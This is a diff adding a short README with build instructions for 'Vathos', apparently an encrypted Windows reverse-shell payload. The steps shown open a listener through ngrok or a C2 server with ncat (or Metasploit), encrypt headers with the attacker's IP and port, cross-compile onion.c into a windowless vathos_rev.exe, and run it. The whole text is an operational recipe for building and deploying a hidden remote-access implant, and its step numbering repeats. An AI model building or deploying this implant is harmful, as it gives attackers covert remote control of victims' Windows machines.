@@ -1,0 +1,27 @@
+# Vathos Build Instructions
+
+1. Start ngrok (or use a legitimate C2 server)
+
+ngrok tcp 4444
+
+2. Start ncat (or metasploit etc)
+
+ncat -nvlkp 4444
+
+3. Generate headers
+
+Run the encryption script with the desired number of rounds, key length, IP address and Port (must match public IP and PORT opened by ngrok service):
+
+python3 encrypt.py -r <rounds> -k <key_length> -c <C2_IP> -p <C2_PORT> 
+
+2. Compile the payload
+
+Use the MinGW-w64 Clang cross-compiler:
+
+x86_64-w64-mingw32-clang --target=x86_64-w64-windows-gnu -O2 -Wno-deprecated-declarations onion.c -o vathos_rev.exe -Wl,-subsystem,windows
+
+3. Run the demo
+
+Execute the demo client with:
+
+vathos_rev.exe 
